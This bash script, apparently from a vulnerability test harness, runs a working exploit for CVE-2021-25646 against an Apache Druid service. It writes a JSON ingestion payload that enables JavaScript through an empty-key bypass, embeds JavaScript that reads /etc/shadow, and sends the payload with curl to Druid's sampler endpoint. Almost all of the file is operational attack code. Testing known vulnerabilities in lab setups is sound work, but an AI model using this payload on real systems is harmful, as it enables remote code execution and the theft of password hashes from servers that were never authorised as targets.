#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing CVE-2021-25646 on ${service_map[apache-druid-service]}"

echo "[+] Creating exploit payload..."
# Create a temporary file with a random name
TEMP_FILE=$(mktemp -t druid-exploit.XXXXXX.json)

# Ensure temp file is removed on script exit
trap 'rm -f "$TEMP_FILE"' EXIT

cat > "$TEMP_FILE" << 'EOF'
{
    "type":"index",
    "spec":{
        "ioConfig":{
            "type":"index",
            "firehose":{
                "type":"local",
                "baseDir":"/etc",
                "filter":"wgetrc"
            }
        },
        "dataSchema":{
            "dataSource":"test",
            "parser":{
                "parseSpec":{
                "format":"javascript",
                "timestampSpec":{
                },
                "dimensionsSpec":{
                },
                "function":"function(){var file = new java.io.File('/etc/shadow'); var content = ''; var fr = new java.io.FileReader(file); var br = new java.io.BufferedReader(fr); var line; while((line = br.readLine()) != null) { content += line + '\\n'; } br.close(); fr.close(); return {timestamp:123123, test: content}}",
                "":{
                    "enabled":"true"
                }
                }
            }
        }
    },
    "samplerConfig":{
        "numRows":10
    }
}
EOF

# Execute the exploit
echo "[+] Executing exploit against Apache Druid..."
curl -X POST -H "Content-Type: application/json" -d @"$TEMP_FILE" http://${service_map[apache-druid-service]}/druid/indexer/v1/sampler
